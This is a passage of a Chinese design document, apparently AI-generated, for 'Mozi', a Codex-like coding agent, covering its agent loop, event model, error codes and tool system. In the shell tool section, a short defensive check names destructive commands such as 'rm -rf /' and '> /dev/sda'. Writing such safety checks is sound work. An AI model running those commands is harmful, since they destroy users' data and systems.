---
AIGC:
  ContentProducer: '001191110102MAD55U9H0F10002'
  ContentPropagator: '001191110102MAD55U9H0F10002'
  Label: '1'
  ProduceID: 'e4b948f4-8078-4d6a-981b-21924d4882a0'
  PropagateID: 'e4b948f4-8078-4d6a-981b-21924d4882a0'
  ReservedCode1: '84184a0e-ac55-4250-837a-89c4f90a4bba'
  ReservedCode2: '84184a0e-ac55-4250-837a-89c4f90a4bba'
---

# 墨子（Mozi）—— 详细设计文档（模块级深化）

> 配套文档：`仿Codex-Agent开发技术方案.md`（总体架构与路线图）
> 本文定位：对技术方案第 4、5 章的每一个模块做**可指导编码**的详细设计。
> 每模块固定结构：职责边界 → 对外契约 → 内部设计（数据/算法/伪代码）→ 边界与错误处理 → 性能考量 → 可测试性。
> 状态：v1.5 草案（v1.1 子智能体；v1.2 完整 MCP；v1.3 定时任务；v1.4 移动端；v1.5 提示词工程/记忆/多模态/Hooks）| 术语：与方案书一致（墨子/Mozi、命令统一小写 mozi、AgentEngine、Session 等）

---

## 目录

- [D0. 模块总览与依赖](#d0-模块总览与依赖)
- [M1 Agent Loop 引擎](#m1-agent-loop-引擎)
- [M2 事件系统与数据模型](#m2-事件系统与数据模型)
- [M3 工具系统](#m3-工具系统)
- [M4 LLM Provider 层](#m4-llm-provider-层)
- [M5 上下文管理](#m5-上下文管理)
- [M6 安全模型与沙箱](#m6-安全模型与沙箱)
- [M7 会话与持久化](#m7-会话与持久化)
- [M8 MCP 集成](#m8-mcp-集成)
- [M9 CLI/TUI 交互层](#m9-clitui-交互层)
- [M10 桌面应用](#m10-桌面应用)
- [M11 测试与评测体系](#m11-测试与评测体系)
- [M12 子智能体编排](#m12-子智能体编排)（v1.1 新增）
- [M13 定时任务与调度](#m13-定时任务与调度)（v1.3 新增）
- [M14 移动端与远程访问](#m14-移动端与远程访问)（v1.4 新增）
- [M15 提示词系统工程](#m15-提示词系统工程prompt-system)（v1.5 新增）
- [M16 记忆系统](#m16-记忆系统memory)（v1.5 新增）
- [M17 多模态](#m17-多模态vision)（v1.5 新增）
- [M18 Hooks 与生命周期插件](#m18-hooks-与生命周期插件)（v1.5 新增）

---

## D0 模块关系总览

```
                         ┌────────────────────────────────────┐
                         │ M9 TUI / M10 Desktop / M14 Mobile   │  (Interface)
                         └──────────────────┬─────────────────┘
                                            │ IPC / 进程内 / WSS(@mozi/protocol)
                         ┌──────────────────▼─────────────────┐
                         │           M1 AgentEngine            │  (Engine 核心)
                         │   ┌──────────────────────┐        │
                         │   │ M12 SubAgentSupervisor│        │
                         │   └──────────────────────┘        │
                         └───┬──────┬──────┬──────┬─────────┘
                             │      │      │      │
        ┌────────────────────┘      │      │      └──────────────────┐
        ▼                           ▼      ▼                         ▼
┌───────────────┐   ┌──────────────────┐ ┌──────────────┐   ┌───────────────┐
│ M5 Context    │   │ M6 Policy/Sandbox │ │ M7 Session  │   │ M8 MCP Client │
│ 上下文管理     │   │ 策略引擎 + 沙箱    │ │ 会话持久化    │   │ 外部工具扩展   │
└──────┬────────┘   └────────┬──────────┘ └──────────────┘   └───────────────┘
       │                     │
┌──────▼─────────────────────▼──────────┐
│  M3 工具系统（ToolRegistry + PatchEngine）│
└──────────────────┬────────────────────┘
                   │
┌──────────────────▼────────────────────┐
│  M4 LLM Provider 层（多模型适配）        │
└───────────────────────────────────────┘
（M13 定时任务调度器驱动同一引擎；M14 中继服务器在节点之外路由加密信封；
  M15-M18 为引擎侧增强：提示词组装/记忆注入/视觉管线/Hooks 拦截器）
```

**数据流总约定（贯穿全部模块）**：

```
输入：RunInput（用户文本 + 会话 ID + 配置覆盖 + AbortSignal）
输出：AsyncIterable<AgentEvent>（单向事件流，UI/持久化/评测共同订阅）

引擎不持有任何 UI 引用；所有需要用户参与的点（审批、确认）都以
tool.approval.required 事件发出，等待外部通过 resolveApproval() 应答。
```

**跨模块契约一页纸**（详细定义见 D2）：

| 契约 | 生产者 | 消费者 | 传输形式 |
|------|--------|--------|---------|
| `AgentEvent` | M1 引擎 | M9/M10 UI、M7 持久化、M11 评测 | AsyncIterable / IPC / WebSocket |
| `ChatMessage[]` | M5 上下文 | M4 Provider | 进程内对象 |
| `ToolSchema[]` | M3 工具注册表 | M1 引擎 → M4 模型 | JSON Schema 数组 |
| `ToolCall` / `ToolResult` | M4 解析 / M3 执行 | M1 引擎调度 | 进程内对象 |
| `PolicyDecision` | M6 策略引擎 | M1 引擎 | 进程内对象 |
| `ApprovalRequest/Result` | M1 引擎 | M9/M10 UI | 事件 + `resolveApproval()` |
| `SubAgentSpec/Result` | M1 引擎（task 工具） | M12 Supervisor | 进程内对象（见 M12） |

---

## M1 Agent Loop 引擎

### 1.1 目标与边界

**职责**：编排一次「用户输入 → 多轮模型推理与工具执行 → 任务完成/终止」的完整闭环；是全部模块的调度中枢。

**不做**：不解析模型协议（M4）、不执行工具（M3）、不制定安全决策（M6）、不持久化（M7）、不渲染 UI（M9/M10）。引擎只做**编排与状态推进**。

### 1.2 术语

| 术语 | 定义 |
|------|------|
| Turn | 一次 `run()` 调用（对应一次用户输入）的完整执行 |
| Step | Turn 内一次「模型推理 →（可选）工具执行」的循环迭代 |
| Pending Approval | 工具调用等待用户/策略裁决的挂起状态 |
| Rollout | 会话中所有事件的时序序列（M7 的持久化单位） |
| SubAgent | 由主会话通过 `task` 工具派发的子智能体（独立 Session/上下文/策略，见 M12） |
| Session 树 | 主会话与各级子会话构成的父子关系树（depth ≤ maxDepth） |

### 1.3 状态机完整定义

```
状态集合：
  IDLE ──── 等待用户输入
  THINKING ── 模型流式推理中（含输出文本与 tool_calls 声明）
  PENDING_APPROVAL ── 有工具调用等待策略裁决（可挂起任意时长）
  EXECUTING ── 工具执行中
  WAITING_COMPACT ── 上下文压缩执行中（异步）
  COMPLETED ── 本轮完成（正常）
  INTERRUPTED ── 被用户/超时中断
  FAILED ── 不可恢复错误

转移表：
  IDLE ──runInput──► THINKING
  THINKING ──reply.toolCalls=[]──► COMPLETED(reason=model_finished)
  THINKING ──reply.toolCalls≠[]──► PENDING_APPROVAL（若存在需审批项）否则 EXECUTING
  PENDING_APPROVAL ──全部裁决完成──► EXECUTING
  EXECUTING ──工具结果回填──► THINKING（下一轮 step）
  THINKING ──上下文达 80% 预算──► WAITING_COMPACT ──压缩完成──► THINKING
  任意状态 ──AbortSignal.abort──► INTERRUPTED（回填原因后结束，保留已完成事件）
  任意状态 ──不可恢复错误──► FAILED（发出 error 事件，终结）
  任意状态 ──step 数超限──► COMPLETED(reason=max_steps_exceeded)
```

### 1.4 对外 API 契约

```ts
// packages/core/src/engine/agent-engine.ts
export interface RunInput {
  sessionId: string;
  text: string;
  /** 本轮配置覆盖（如临时切模型），未提供则用会话配置 */
  overrides?: Partial<SessionConfig>;
  /** 外部取消句柄（UI Esc / 超时 / 进程信号） */
  signal?: AbortSignal;
}

export class AgentEngine {
  /** 唯一主入口：产生事件流。消费方负责迭代或转发；引擎不缓存 */
  run(input: RunInput): AsyncIterable<AgentEvent>;

  /** 应答一个挂起的审批请求（UI 调用；调用前必须存在 PENDING_APPROVAL） */
  resolveApproval(sessionId: string, callId: string, decision: 'allow' | 'deny'): void;

  /** 立即中止指定会话的进行中 run（等价 signal.abort） */
  abort(sessionId: string, reason?: string): void;

  /** 查询会话当前状态快照（UI 需要同步视图时用） */
  getSnapshot(sessionId: string): SessionSnapshot;
}

export interface SessionSnapshot {
  sessionId: string;
  state: EngineState;
  currentStep: number;
  lastToolCalls: ToolCall[];
  pendingApprovals: ApprovalTicket[];
  usage: TokenUsage;
  startedAt: string;
}
```

**约束**：

- 同一 session 的 `run()` 不可并发（引擎在 `run` 入口检查，重复调用抛出 `ERR_SESSION_BUSY`）；不同 session 可并行（桌面端多会话的基础）；
- `resolveApproval` 对不存在的 callId 静默忽略（幂等，UI 可能重发）；
- 引擎内部所有 Promise 竞争使用 `AbortSignal` 而非 try/catch 吞错。

### 1.5 主循环（含调度与资源控制的完整伪代码）

```ts
// packages/core/src/engine/agent-engine.ts（核心实现）
export class AgentEngine {
  // ── 依赖注入（全部为接口，便于测试替换） ──
  constructor(deps: {
    providers: ProviderRegistry;   // M4
    tools: ToolRegistry;           // M3
    policy: PolicyEngine;          // M6
    context: ContextManager;       // M5
    sessions: SessionStore;        // M7
  }) {}

  async *run(input: RunInput): AsyncIterable<AgentEvent> {
    const session = this.sessions.loadOrCreate(input.sessionId);
    if (session.running) throw new MoziError('ERR_SESSION_BUSY');
    session.running = true;
    const ac = new AbortController();
    // 联动外部 signal 与内部超时
    input.signal?.addEventListener('abort', () => ac.abort(input.signal.reason));
    const budget = session.limits;

    yield { type: 'turn.started', turnId: genId(), input: input.text };
    session.push({ role: 'user', content: [{ type: 'text', text: input.text }] });

    try {
      for (let step = 0; step < budget.maxSteps; step++) {
        // ── 1. 上下文组装（预算裁剪 + AGENTS.md + 压缩触发） ──
        const view = this.context.build(session, ac.signal);
        if (view.compacted) yield { type: 'context.compacted', ...view.compactInfo };

        // ── 2. 模型推理（流式） ──
        const provider = this.providers.resolve(session.config.models.executor);
        const stream = provider.chat({
          messages: view.messages,
          tools: this.tools.schemas(),
          signal: ac.signal,
          maxOutputTokens: budget.maxOutputTokens,
        });

        let reply: AssistantMessage | undefined;
        for await (const ev of stream) {
          if (ev.type === 'text.delta') yield { type: 'message.delta', text: ev.text };
          if (ev.type === 'usage') yield { type: 'token.usage', usage: ev.usage };
          // toolcall delta 在 provider 内部聚合，不逐分片外发
        }
        reply = stream.result(); // 聚合后的最终 assistant message
        if (ac.signal.aborted) { yield interruptEvent(ac.signal.reason); return; }

        session.push(reply); // 含 content 与 toolCalls（无则 endReason='stop'）

        // ── 3. 无工具调用 → 完成 ──
        if (!reply.toolCalls.length) {
          yield { type: 'task.completed', reason: 'model_finished' };
          return;
        }

        // ── 4. 策略裁决（全部调用先过策略） ──
        const tickets = await this.arbitrate(session, reply.toolCalls, ac.signal);

        // ── 5. 调度执行：读并行 / 写串行（见 1.6） ──
        const groups = this.tools.groupBySafety(reply.toolCalls);
        for (const group of groups) {
          const outcomes = await Promise.all(
            group.map((call) => this.executeOne(session, call, tickets, ac.signal)),
          );
          for (const ev of outcomes.flat()) yield ev;
        }

        // ── 6. 本步收尾：回填 tool 消息 + 用量账目 ──
        yield { type: 'step.completed', step, usage: session.usage };
      }
      yield { type: 'task.completed', reason: 'max_steps_exceeded' };
    } catch (err) {
      const e = normalizeError(err);
      yield { type: 'error', error: e, recoverable: e.recoverable };
    } finally {
      session.running = false;
      this.context.release(session.id); // 释放 token 预算缓存
    }
  }
}
```

### 1.6 工具调度：读并行 / 写串行（贪心分组算法）

工具按 `riskLevel` 分三类：`read`（可并行）、`write`（串行）、`exec`（串行，且不与其他 exec 并发）。

```ts
function groupBySafety(calls: ToolCall[]): ToolCall[][] {
  const groups: ToolCall[][] = [];
  let bufferedReads: ToolCall[] = [];
  for (const c of calls) {
    if (c.riskLevel === 'read') { bufferedReads.push(c); continue; }
    if (bufferedReads.length) { groups.push(bufferedReads); bufferedReads = []; }
    groups.push([c]); // write/exec 各成一组，串行
  }
  if (bufferedReads.length) groups.push(bufferedReads);
  return groups;
}
```

**调度语义**：
- 读组内并发数上限 = `min(8, calls.length)`（防读风暴打爆 IO）；
- write/exec 之间严格串行；同一组只发一个 Promise；
- 若 exec 工具内部自己再发起工具调用（极少，MCP server 内部行为），由 M8 隔离，不计入本算法。

### 1.7 中断与恢复语义（精确规格）

| 中断源 | 行为 | 回填给模型的内容 |
|--------|------|-----------------|
| 用户 Esc / UI 取消 | `ac.abort('user_interrupt')`；等待当前 LLM 流或工具执行自然终止（最多 2s 强杀） | system message：「用户已中断。请简要总结已完成的进度与未完成项，不要继续执行。」 |
| 工具超时 | 工具层 120s 超时（可配置），返回 `tool timeout` 错误给模型 | 模型可见错误信息（工具结果 isError=true） |
| LLM 空闲超时 | 300s 无任何流数据 → 视为流中断，重试一次 | — |
| 进程信号（SIGINT×2 / SIGTERM） | 立即落盘事件日志（M7 保证最多丢 500ms），终止进程，会话可 resume | — |

**关键设计**：中断 ≠ 回滚。已完成的事件（工具调用成功、输出）全部保留在事件日志中，`resume` 后从断点继续。

### 1.8 资源管控参数（默认值与语义）

```ts
export interface SessionLimits {
  maxSteps: number;          // 默认 50；超过后 COMPLETED(max_steps_exceeded)
  maxTokensPerTurn: number;  // 默认 32k；超出注入警告并停止（防单轮失控）
  maxOutputTokens: number;   // 默认 4k；单次模型输出上限
  idleTimeoutMs: number;     // 默认 300_000；LLM 无输出超时
  toolTimeoutMs: number;     // 默认 120_000；单个工具执行超时（shell 可自定义）
  maxCost?: number;          // 可选：会话累计成本上限（按 provider 计价表估算）
}
```

超过 `maxCost` 时：发出 `error(recoverable: true, code: ERR_COST_LIMIT)`，引擎暂停并等待用户确认继续。

### 1.9 可测试性设计（与 M11 呼应）

- 引擎所有依赖接口化，`ScriptedProvider` 可注入任意回复序列；
- 引入 `TestClock`（可手动拨动时间），超时/中断测试不 sleep；
- 状态机用 XState 或自写 reducer 均可用，**要求状态转移是纯函数**（`reduce(state, event) → state`），便于穷举测试；
- 对每个状态转移场景（12 类）编写确定性集成测试（见 M11 测试矩阵）。

### 1.10 性能预算

- 单步纯引擎开销（无模型调用）< 5ms；
- 事件发射 O(1)（环形缓冲 + 广播）；
- 引擎不拷贝消息数组（引用传递 + 不可变约定）：`buildContext` 返回的 messages 只读（`Object.freeze` 于 debug 模式）。

---

---

## M2 事件系统与数据模型

### 2.1 目标与边界

**职责**：定义全系统共享的数据契约（事件、消息、请求、错误），保证进程内直连与跨进程传输行为一致。

**约束**：
- `@mozi/shared` **零运行时依赖**（只用 TS 类型 + 少量纯函数），严禁 import 引擎/工具/UI 任何代码；
- 所有 DTO 必须是 plain object：可 `JSON.stringify`、可结构化克隆、可版本化；
- 每个事件必须带 `ts`（ISO8601 时间戳）与 `sessionId`（除 session.started 外），用于排序与重放定位。

### 2.2 事件全集（最终定义）

```ts
// packages/shared/src/events.ts  （v1 全量）
export type AgentEvent =
  // ── 会话 ──
  | { type: 'session.started'; sessionId: string; config: SessionConfig; ts: string }
  | { type: 'session.resumed'; sessionId: string; replayedEvents: number; ts: string }
  | { type: 'session.terminated'; sessionId: string; reason: 'user' | 'error' | 'shutdown'; ts: string }

  // ── 轮次与输出 ──
  | { type: 'turn.started'; turnId: string; input: string; ts: string }
  | { type: 'message.delta'; text: string; ts: string }            // 模型流式文本（含原因？不含，见 M4）
  | { type: 'message.completed'; message: AssistantMessage; ts: string }

  // ── 工具生命周期 ──
  | { type: 'tool.requested'; call: ToolCall; ts: string }
  | { type: 'tool.approval.required'; call: ToolCall; reason: ApprovalReason; ts: string }
  | { type: 'tool.approval.resolved'; callId: string; decision: 'allow' | 'deny'; by: 'user' | 'policy'; ts: string }
  | { type: 'tool.started'; callId: string; ts: string }
  | { type: 'tool.completed'; callId: string; result: ToolResult; ts: string }

  // ── 上下文 ──
  | { type: 'context.compacted'; removedTurns: number; savedTokens: number; summary: string; ts: string }

  // ── 用量与终止 ──
  | { type: 'token.usage'; usage: TokenUsage; ts: string }
  | { type: 'turn.completed'; usage: TokenUsage; steps: number; ts: string }
  | { type: 'task.completed'; reason: TaskCompleteReason; ts: string }
  | { type: 'error'; error: AgentError; recoverable: boolean; ts: string }
  | { type: 'internal.debug'; message: string; data?: unknown; ts: string }; // debug 模式专用，生产不落盘
  // v1.1 新增：subagent.* 事件（完整定义见 M12 §12.8，此处仅索引）
  // subagent.started / subagent.queued / subagent.progress /
  // subagent.approval.required / subagent.completed / subagent.failed
  // v1.2 新增：mcp.* 事件（完整定义见 M8 §8.15，此处仅索引）
  // mcp.server.status / mcp.sampling.requested / mcp.sampling.resolved /
  // mcp.elicit.requested / mcp.elicit.resolved

export type TaskCompleteReason =
  | 'model_finished' | 'max_steps_exceeded' | 'user_interrupt'
  | 'token_budget_exceeded' | 'cost_limit_reached';

export type ApprovalReason =
  | { kind: 'policy'   ; ruleId: string; detail: string }
  | { kind: 'risk'     ; segments: CommandSegment[] }   // 命令风险分析明细
  | { kind: 'manual'   ; note: string };                // 用户在 UI 强制要求确认
```

### 2.3 消息与调用类型

```ts
// 用户消息内容（支持多模态）
export type UserContent =
  | { type: 'text'; text: string }
  | { type: 'image'; dataUrl: string; alt?: string }     // vision
  | { type: 'file'; path: string; ref: string };         // 会话内文件引用（桌面端）

export interface AssistantMessage {
  role: 'assistant';
  content: string | null;
  toolCalls?: ToolCall[];
  reasoning?: string;       // 思考过程（provider 剥离后供 UI 展示；不入上下文）
  usage?: TokenUsage;       // 模型返回的真实 usage（若有）
}

export interface ToolCall {
  id: string;               // 会话内唯一（provider 生成的 call_id 或引擎生成）
  name: string;
  arguments: unknown;       // 已通过 schema 校验
  riskLevel: 'read' | 'write' | 'exec' | 'meta';
}

export interface ToolResult {
  callId: string;
  content: string;          // 给模型：最终渲染文本（已截断）
  display?: DisplayPayload; // 给用户：结构化展示（diff/markdown/table）
  isError: boolean;
  meta?: { durationMs?: number; truncated?: boolean; exitCode?: number; errorKind?: string };
}

// 展示负载（UI 渲染协议，与引擎无耦合）
export type DisplayPayload =
  | { kind: 'diff'; file: string; before: string; after: string; hunks: number }
  | { kind: 'markdown'; text: string }
  | { kind: 'table'; headers: string[]; rows: string[][] }
  | { kind: 'json'; data: unknown }
  | { kind: 'tree'; entries: string[] };

export interface TokenUsage {
  inputTokens: number;
  outputTokens: number;
  totalTokens: number;
  costUsd?: number;        // 引擎按计价表估算
  model: string;
}

export interface AgentError {
  code: ErrorCode;         // 见 2.5
  message: string;
  recoverable: boolean;    // recoverable=true → UI 可建议「重试」
  detail?: unknown;        // 结构化的内部信息（不暴露给模型）
}
```

### 2.4 事件版本化与演进策略

**规则（Additive-only）**：

1. 字段只增不删、不改名、不改类型；
2. 新事件类型 = 新增联合成员（`type` 值互斥）；
3. 每个 `AgentEvent` 带 `_v?: number`（缺省即 v1）；
4. 任何字段改为可选即视为破坏性（旧消费者读新数据可能 undefined），需先加新字段再废旧字段（两阶段发布）。

**迁移**：`@mozi/shared/migrations` 提供 `migrateEvent(raw: unknown): AgentEvent`，未知 `type` 跳过并记录（forward-compatible）；未知字段保留透传（opaque passthrough）。

### 2.5 错误码体系

```ts
export const ErrorCodes = {
  // 引擎层
  ERR_SESSION_BUSY: 'ERR_SESSION_BUSY',
  ERR_MAX_STEPS: 'ERR_MAX_STEPS',
  ERR_TOKEN_BUDGET: 'ERR_TOKEN_BUDGET',
  ERR_COST_LIMIT: 'ERR_COST_LIMIT',
  // 模型层
  ERR_PROVIDER_UNAVAILABLE: 'ERR_PROVIDER_UNAVAILABLE',
  ERR_PROVIDER_TIMEOUT: 'ERR_PROVIDER_TIMEOUT',
  ERR_MODEL_AUTH: 'ERR_MODEL_AUTH',
  ERR_MODEL_RATE_LIMIT: 'ERR_MODEL_RATE_LIMIT',
  ERR_TOOLCALL_PARSE: 'ERR_TOOLCALL_PARSE',      // 工具参数 JSON 解析失败（可重试）
  // 工具层
  ERR_TOOL_NOT_FOUND: 'ERR_TOOL_NOT_FOUND',
  ERR_TOOL_TIMEOUT: 'ERR_TOOL_TIMEOUT',
  ERR_TOOL_VALIDATION: 'ERR_TOOL_VALIDATION',    // schema 校验失败
  ERR_TOOL_INTERNAL: 'ERR_TOOL_INTERNAL',
  // 文件层
  ERR_PATH_OUTSIDE: 'ERR_PATH_OUTSIDE',          // 越界
  ERR_FILE_NOT_FOUND: 'ERR_FILE_NOT_FOUND',
  ERR_PATCH_PARSE: 'ERR_PATCH_PARSE',
  ERR_PATCH_MISMATCH: 'ERR_PATCH_MISMATCH',
  // 沙箱
  ERR_SANDBOX_UNSUPPORTED: 'ERR_SANDBOX_UNSUPPORTED',
  ERR_SANDBOX_SPAWN: 'ERR_SANDBOX_SPAWN',
  // MCP（v1.2）
  ERR_MCP_INIT_TIMEOUT: 'ERR_MCP_INIT_TIMEOUT',   // 握手超时
  ERR_MCP_UNAVAILABLE: 'ERR_MCP_UNAVAILABLE',     // 熔断/离线/降级
  ERR_MCP_AUTH_REQUIRED: 'ERR_MCP_AUTH_REQUIRED', // OAuth 未授权/token 失效
  ERR_MCP_PROTOCOL: 'ERR_MCP_PROTOCOL',           // 非法 JSON-RPC（断开不重试）
} as const;
```

所有错误在边界处**规整**（normalize）：引擎收到任何 throw，统一转换为 `AgentError`，不得把裸 `Error` 泄漏给事件流 / UI / 模型。

### 2.6 性能与索引

- 事件流实现为 `AsyncIterable` + 内部 `RingBuffer<AgentEvent>`（容量 256），消费慢则丢弃 `message.delta`（UI 已渲染）但不丢关键事件（tool/approval/completed）；
- 事件写盘（M7）在同一进程内按 `event.ts` 顺序追加，不重排；
- 重放（resume）按 `event.ts` 排序即可（磁盘单调递增）。

---

## M3 工具系统

### 3.1 目标与边界

**职责**：工具注册、参数校验、执行调度、结果渲染（模型可见 + 用户可见双通道）、结构化编辑（PatchEngine）、工作区路径安全。

**边界**：不决定「能否执行」（策略在 M6，引擎调用 M6）；不管理工具生命周期进程（shell 子进程由 sandbox 包管理）。

### 3.2 工具协议与注册表

```ts
// packages/tools/src/types.ts
export interface AgentTool<TInput = unknown, TOut = unknown> {
  name: string;
  version: string;                 // 工具自身版本（描述变更可追溯）
  description: string;             // 模型可见的用途说明（精雕，见 3.6）
  parameters: JSONSchema7;         // 参数 schema（M4 会直接转成 provider 格式）
  riskLevel: 'read' | 'write' | 'exec' | 'meta';
  /** 该工具执行时可用的上下文（工作区、信号、沙箱通道） */
  execute(input: TInput, ctx: ToolContext): Promise<ToolResult>;
}

export class ToolRegistry {
  private tools = new Map<string, AgentTool>();

  register(tool: AgentTool): void;                 // 同名重复注册 → ERR_TOOL_EXISTS
  unregister(name: string): void;
  get(name: string): AgentTool;
  /** 模型可见的 schemas（provider 层再按需裁剪 description 长度） */
  schemas(): Array<{ name: string; description: string; parameters: JSONSchema }>;
  /** 按 riskLevel 分组（供引擎调度） */
  groupBySafety(calls: ToolCall[]): ToolCall[][];
}
```

**输入校验**：执行前用 Ajv（strict 模式）校验 `arguments`，失败返回 `ERR_TOOL_VALIDATION`（错误信息含 JSON 指针定位，便于模型自纠）。校验器缓存编译结果（首次编译后复用）。

### 3.3 内置工具规格（逐个）

#### 3.3.1 `read_file`（read）

```
parameters:
  path: string        // 相对 workspace 根或绝对（须在边界内）
  offset?: number     // 起始行号（1-based，默认 1）
  limit?: number      // 最大行数（默认 500，上限 2000）

result.content 格式：
  <file:src/foo.ts (1-200/1000)>
  1  | const x = 1;
  ...
  200| }
  <... lines 201-1000 omitted; use offset=201 to read more>
```

- 自动追加行号前缀（便于 patch 引用行号）；
- `path` 为目录时返回目录树（list_dir 的别名）；
- 二进制检测：读入前 8KB 判断 NUL 字节，若是则返回「binary file, use shell xxd/file」。

#### 3.3.2 `write_file`（write）

- 适用于新建或整体重写小文件（≤ 300 行建议直接 write）；
- 幂等：先创建父目录（递归）再写；写前**不要求读**（但模型通常应先 read，工具侧不做强制）；
- 写入后自动触发 M5 的文件新鲜度失效。

#### 3.3.3 `edit_file`（write）—— apply_patch 协议

见 3.5 PatchEngine。参数：

```ts
{ patch: string }   // 见 3.5.1 的 patch 语法
```

#### 3.3.4 `glob`（read）

```
parameters: { pattern: string; cwd?: string; limit?: number(默认 200) }
content 格式：
  <glob "packages/**/*.ts" matched 32 files>
  packages/core/src/index.ts
  packages/core/src/engine/agent-engine.ts
  ...（超过 limit 截断并在 meta 提示）
```

- 实现优先 `fast-glob`（比 minimatch 快一个量级，纯 JS 无原生依赖）；
- 忽略规则与 gitignore 合并（用 `ignore` 包）。

#### 3.3.5 `grep`（read）

```
parameters: { pattern: string; include?: string[]; exclude?: string[]; cwd?: string; maxMatches?: number(默认50) }
返回行级：
src/engine/agent-engine.ts:42:  for (let step = 0; step < budget.maxSteps; step++) {
```

- 优先尝试 ripgrep（`rg --json --line-number --max-count`）；不存在则降级 `fast-glob + RegExp`（异步分批，防卡死主线程）；
- `maxMatches` 超限时在末尾输出 `... [truncated, refine pattern]`。

#### 3.3.6 `shell`（exec）

```
parameters:
 { command: string; cwd?: string; timeoutMs?: number(≤600000); env?: Record<string,string> }
（Windows 下 shell 为 cmd.exe 包装；POSIX 为 sh -c；git-bash 可选）
- 输出：stdout / stderr 合并为 content（stderr 前缀 [stderr] 行）
- 截断策略：头 200 行 + 尾 50 行
- exit code 非 0 → isError=true，content 含退出码
- 所有执行必须经 sandbox 通道（M6）
```

**命令内容敏感词防误**：若命令包含 `rm -rf /`、`> /dev/sda` 等危险目标，`shell` 自身再校验一次（双保险，策略引擎之外的最后防线）。

#### 3.3.7 `todo_list`（meta）

```
parameters: { operation: 'list' | 'update'; tasks?: TodoTask[] }
TodoTask: { id; title; status: 'pending'|'in_progress'|'done'; detail?: string }
- 引擎维护会话级 todo 状态（放 session.meta）
- 输出：
  [ ] 1. 修复登录接口 500
  [x] 2. 补单元测试
- 描述词要求模型：任务 >5 步时必须先建 todo；每完成一项 update 一次
```

#### 3.3.8 `list_dir`（read）

```
parameters: { path: string; depth?: number(默认2); showHidden?: boolean }
返回目录树（ASCII），叶子文件带大小（KB/MB），目录带 / 后缀
```

#### 3.3.9 `task`（meta）—— 子智能体派发（v1.1 新增）

```
parameters:
 { agent: string           // 模板名：'explore' | 'general' | 'reviewer' | 自定义（.mozi/agents/*.md）
 , prompt: string          // 子任务指令（必须自包含，子智能体看不到主对话）
 , contextFiles?: string[] // 预注入文件（各截断 2k）
 , timeoutMs?: number }

- riskLevel: meta（自身无副作用；子智能体内部的工具调用受子策略管控，见 M12 §12.6）
- 返回：结构化摘要（结论/相关文件/建议，~200-500 token，截断上限 4k）
- display: { kind:'markdown' } 折叠卡片，可展开子会话全程（M12 §12.11）
- 引擎处理特殊路径：主会话默认注册；并发槽位排队；父中断级联取消
- 完整契约见 M12（§12.4 工具规格 / §12.5 并发控制）
```

### 3.4 输出截断算法（通用）

```ts
/** 保留 head 与 tail，中间省略，并给出可恢复提示 */
function truncate(text: string, head = 200, tail = 50): { text: string; truncated: boolean } {
  const lines = text.split('\n');
  if (lines.length <= head + tail) return { text, truncated: false };
  return {
    text: [...lines.slice(0, head), `\n...[${lines.length - head - tail} lines truncated]...\n`, ...lines.slice(-tail)].join('\n'),
    truncated: true,
  };
}
```

所有工具 result 的 `meta.truncated=true` 时，模型会看到截断标记，从而选择缩小范围或分页——这是「上下文预算的第一道防线」，必须保持显式可读。

### 3.5 PatchPalette（apply_patch 结构化编辑）

#### 3.5.1 Patch 语法（v1）

```
*** Begin Patch
*** Update File: src/utils/date.ts
@@ hunk 锚点（可选：紧邻的 context 行，通常取函数签名第一行）
-       旧行内容
+       新行内容
 未变行（context，前缀 空格）
*** Add File: src/utils/now.ts
+export const now = () => Date.now();
*** Delete File: src/utils/legacy-date.ts
*** End Patch
```

语法规则：
- 每个文件操作以 `*** <Op> File: <path>` 开始；op ∈ {Update, Add, Delete}；
- Update 内 hunk 块之间以空行分隔；每行前缀 `+`/`-`/` `（空格=context）；
- Add 的正文行前缀 `+`；Delete 无正文；
- `*** End Patch` 必需，缺则 `ERR_PATCH_PARSE`；
- 一个 patch 可包含多个文件操作（最多 10 个文件，防单条消息过大）。

#### 3.5.2 解析器（Parser）

```ts
// 状态机：Header → FileOp → HunkLines → (下一个 FileOp | End)
function parsePatch(text: string): PatchFile[];   // throws PatchParseError
```

出错信息必须是**可行动的**（给模型看）：「第 4 行：缺少 File 路径；第 12 行：hunk 前缀非法 '~'」。

#### 3.5.3 匹配器（Matcher）——核心算法

对每个 `Update File` 的 hunk，在目标文件全文中定位：

```
输入：目标行数组 lines[0..n]，hunk 的签名序列（context 行 + 删除行，按原顺序）
输出：每个 hunk 的匹配区间 [start, end)（同一文件内 hunk 依序，后一 hunk 从前一匹配尾部搜索）

算法（多锚点贪心 + 回溯降级）：
1. 计算签名长度 L（context+delete 行数）
2. 从 prevEnd 起线性扫描，找第一个位置 i 使 lines[i..i+L) 与签名逐行相等（行尾空白忽略）
3. 若整段找不到：降级为「前缀匹配」——只匹配签名前 3 行作为锚点，返回 mismatch
   报告：期望的签名前 3 行 / 实际找到的最近近似行（Levenshtein 距离最小者）
4. 找到匹配后，应用替换：签名位置换成新增行，context 行保持原样
```

**容错规范**（决定 PatchPalette 好用与否）：
- 行尾空白：比较时 trim 行尾 `\s+`；
- 缩进差异：context/delete 行在 `(非空白首字符相同的前提下)` 允许前导空白不同——匹配成功后输出 `(indent adjusted)` 提示；
- 不匹配策略的**原子性**：任一文件任一 hunk 失败 → 整个 patch 拒绝（不部分应用），返回 `ERR_PATCH_MISMATCH` 并附完整诊断（文件、hunk 序号、期望/实际内容）。

#### 3.5.4 应用器（Applier）与快照

```
1. 全部文件匹配成功后，进入「应用阶段」（同一事务）：
   - 校验：目标文件存在性、编码（仅支持 UTF-8；检测 BOM 保留 BOM）
   - 备份：将原文件复制到 <session>/snapshots/<ts>-<basename>
   - 写入：临时文件 + rename（原子，防止写一半）
2. 若中间文件写入失败：已写文件回滚到快照，抛 ERR_TOOL_INTERNAL
3. 结果 display: { kind:'diff', before, after } 供 UI 展示
```

#### 3.5.5 工具描述（写给模型的文本，位于 description）

```
edit_file：用结构化 patch 修改已有文件。
规则：
1) 修改前必须已 read_file 了解当前内容；禁止盲改。
2) context 行选 2-3 行稳定锚点（函数签名、明显注释）；不要用空行做锚点。
3) 新增多行代码放 Update 里；新建文件用 Add；删除整个文件用 Delete。
4) 若改动行数超过文件 40%，改用 write_file 整体重写。
5) patch 中所有路径相对工作区根。
6) 失败会返回精确错误，请修正后重试，不要重复提交相同 patch。
```

### 3.6 工具描述词管理

- 描述文本单独存放 `packages/tools/src/descriptions/*.md`，构建时注入（而非散落在代码）；
